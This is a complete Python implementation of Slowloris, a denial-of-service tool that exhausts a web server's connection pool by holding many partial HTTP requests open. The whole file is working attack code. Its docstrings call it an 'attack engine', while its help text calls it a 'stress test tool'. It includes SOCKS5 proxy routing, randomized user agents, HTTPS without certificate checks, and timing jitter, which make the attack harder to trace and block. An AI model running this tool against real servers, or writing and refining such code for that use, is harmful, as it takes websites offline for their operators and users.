#!/usr/bin/env python3
"""Slowloris - Low bandwidth DoS tool rewritten with modern Python practices.

This implementation uses asyncio for maximum concurrent connection handling,
proper resource management, and clean architecture without monkey-patching.
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import random
import signal
import socket
import ssl
import sys
import time
from dataclasses import dataclass
from typing import Optional, Set

__version__ = "0.3.0"

# Modern user agents (2024)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
]

# Optional SOCKS5 support
try:
    from python_socks import ProxyType
    from python_socks.async_.asyncio import Proxy
    _PROXY_AVAILABLE = True
except ImportError:
    _PROXY_AVAILABLE = False


@dataclass(frozen=True)
class Config:
    """Configuration for Slowloris attack."""
    host: str
    port: int = 80
    sockets: int = 150
    verbose: bool = False
    randuseragent: bool = False
    useproxy: bool = False
    proxy_host: str = "127.0.0.1"
    proxy_port: int = 8080
    https: bool = False
    sleeptime: float = 15.0
    jitter: float = 3.0


class Slowloris:
    """Asyncio-based Slowloris attack engine.
    
    Manages multiple concurrent connections to exhaust a target server's
    connection pool by sending partial HTTP requests and keeping them alive
    with periodic dummy headers.
    """
    
    def __init__(self, config: Config) -> None:
        self.config = config
        self._shutdown = asyncio.Event()
        self._tasks: Set[asyncio.Task[None]] = set()
        self._ssl: Optional[ssl.SSLContext] = None
        
        if config.https:
            self._ssl = ssl.create_default_context()
            self._ssl.check_hostname = False
            self._ssl.verify_mode = ssl.CERT_NONE
        
        # Statistics
        self._connections_created = 0
        self._connections_failed = 0
    
    async def _open_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Establish a connection to the target, optionally via SOCKS5 proxy."""
        if self.config.useproxy:
            if not _PROXY_AVAILABLE:
                raise RuntimeError(
                    "SOCKS5 proxy support requires 'python-socks' package. "
                    "Install it with: pip install python-socks"
                )
            proxy = Proxy.create(
                proxy_type=ProxyType.SOCKS5,
                host=self.config.proxy_host,
                port=self.config.proxy_port,
            )
            sock = await proxy.connect(
                dest_host=self.config.host,
                dest_port=self.config.port,
                timeout=10,
            )
            return await asyncio.wait_for(
                asyncio.open_connection(sock=sock, ssl=self._ssl),
                timeout=10.0,
            )
        
        # Resolve address with IPv6 support
        addrinfo = socket.getaddrinfo(
            self.config.host,
            self.config.port,
            socket.AF_UNSPEC,
            socket.SOCK_STREAM,
        )
        
        last_error: Optional[Exception] = None
        for family, socktype, proto, canonname, sockaddr in addrinfo:
            try:
                return await asyncio.wait_for(
                    asyncio.open_connection(sockaddr[0], self.config.port, ssl=self._ssl),
                    timeout=10.0,
                )
            except OSError as e:
                last_error = e
                continue
        
        if last_error:
            raise last_error
        raise OSError(f"Could not connect to {self.config.host}:{self.config.port}")
    
    def _get_user_agent(self) -> str:
        """Return a user agent string."""
        if self.config.randuseragent:
            return random.choice(USER_AGENTS)
        return USER_AGENTS[0]
    
    async def _send_initial_request(self, writer: asyncio.StreamWriter) -> None:
        """Send the initial partial HTTP request."""
        query = random.randint(0, 9999)
        lines = [
            f"GET /?{query} HTTP/1.1\r\n",
            f"Host: {self.config.host}\r\n",
            f"User-Agent: {self._get_user_agent()}\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Connection: keep-alive\r\n",
        ]
        for line in lines:
            writer.write(line.encode())
        await writer.drain()
    
    async def _worker(self) -> None:
        """Maintain a single Slowloris connection."""
        retry_delay = 1.0
        
        while not self._shutdown.is_set():
            writer: Optional[asyncio.StreamWriter] = None
            try:
                reader, writer = await self._open_connection()
                self._connections_created += 1
                await self._send_initial_request(writer)
                retry_delay = 1.0  # Reset on success
                
                while not self._shutdown.is_set():
                    # Send keep-alive header
                    if writer and not writer.is_closing():
                        header_val = random.randint(1, 5000)
                        writer.write(f"X-a: {header_val}\r\n".encode())
                        await writer.drain()
                    
                    # Calculate sleep time with jitter
                    if self.config.jitter > 0:
                        sleep_time = self.config.sleeptime + random.uniform(
                            -self.config.jitter, self.config.jitter
                        )
                    else:
                        sleep_time = self.config.sleeptime
                    
                    # Wait with early exit on shutdown
                    try:
                        await asyncio.wait_for(
                            self._shutdown.wait(),
                            timeout=sleep_time
                        )
                    except asyncio.TimeoutError:
                        pass  # Normal timeout, continue loop
                    
                    # Check if connection was closed by server
                    if writer and writer.is_closing():
                        break
                        
            except asyncio.TimeoutError:
                self._connections_failed += 1
                logging.debug("Connection timeout")
            except ConnectionRefusedError:
                self._connections_failed += 1
                logging.debug("Connection refused")
            except OSError as e:
                self._connections_failed += 1
                logging.debug("Connection error: %s", e)
            except RuntimeError as e:
                logging.error("Runtime error: %s", e)
                raise
            except Exception as e:
                logging.debug("Unexpected error: %s", e)
            finally:
                if writer and not writer.is_closing():
                    writer.close()
                    await writer.wait_closed()
            
            # Exponential backoff with cap
            if not self._shutdown.is_set():
                await asyncio.sleep(retry_delay)
                retry_delay = min(retry_delay * 1.5, 10.0)
    
    async def run(self) -> None:
        """Run the Slowloris attack."""
        logging.info(
            "Starting attack on %s:%s with %d sockets",
            self.config.host,
            self.config.port,
            self.config.sockets
        )
        
        # Create worker tasks
        for _ in range(self.config.sockets):
            task = asyncio.create_task(self._worker())
            self._tasks.add(task)
            task.add_done_callback(self._tasks.discard)
        
        # Wait for shutdown signal
        await self._shutdown.wait()
        
        # Graceful shutdown
        logging.info("Shutting down connections...")
        for task in self._tasks:
            task.cancel()
        
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)
        
        logging.info(
            "Attack complete. Created: %d, Failed: %d",
            self._connections_created,
            self._connections_failed
        )
    
    def stop(self) -> None:
        """Signal shutdown."""
        self._shutdown.set()


def setup_logging(verbose: bool) -> None:
    """Configure logging."""
    level = logging.DEBUG if verbose else logging.INFO
    format_str = "[%(asctime)s] %(message)s"
    date_format = "%d-%m-%Y %H:%M:%S"
    logging.basicConfig(level=level, format=format_str, datefmt=date_format)


def parse_args() -> Config:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Slowloris, low bandwidth stress test tool for websites",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "host",
        nargs="?",
        help="Host to perform stress test on",
    )
    parser.add_argument(
        "-p", "--port",
        default=80,
        type=int,
        help="Port of webserver, usually 80 or 443",
    )
    parser.add_argument(
        "-s", "--sockets",
        default=150,
        type=int,
        help="Number of concurrent connections to maintain",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose logging",
    )
    parser.add_argument(
        "-ua", "--randuseragents",
        action="store_true",
        help="Randomize user-agent for each connection",
    )
    parser.add_argument(
        "-x", "--useproxy",
        action="store_true",
        help="Use SOCKS5 proxy for connections",
    )
    parser.add_argument(
        "--proxy-host",
        default="127.0.0.1",
        help="SOCKS5 proxy host (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--proxy-port",
        default=8080,
        type=int,
        help="SOCKS5 proxy port (default: 8080)",
    )
    parser.add_argument(
        "--https",
        action="store_true",
        help="Use HTTPS for connections",
    )
    parser.add_argument(
        "--sleeptime",
        default=15,
        type=float,
        help="Seconds between keep-alive headers (default: 15)",
    )
    parser.add_argument(
        "--jitter",
        default=3,
        type=float,
        help="Random jitter added to sleep time (default: 3)",
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"%(prog)s {__version__}",
    )
    
    args = parser.parse_args()
    
    if not args.host:
        parser.print_help()
        sys.exit(1)
    
    return Config(
        host=args.host,
        port=args.port,
        sockets=args.sockets,
        verbose=args.verbose,
        randuseragent=args.randuseragents,
        useproxy=args.useproxy,
        proxy_host=args.proxy_host,
        proxy_port=args.proxy_port,
        https=args.https,
        sleeptime=args.sleeptime,
        jitter=args.jitter,
    )


def main() -> None:
    """Main entry point."""
    config = parse_args()
    setup_logging(config.verbose)
    
    # Setup signal handlers
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    slowloris = Slowloris(config)
    
    def signal_handler(signum, frame):
        logging.info("Received interrupt signal, shutting down...")
        slowloris.stop()
    
    # Register signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        loop.run_until_complete(slowloris.run())
    except KeyboardInterrupt:
        logging.info("Interrupted, shutting down...")
        slowloris.stop()
        loop.run_until_complete(asyncio.sleep(0.5))
    finally:
        loop.close()


if __name__ == "__main__":
    main()
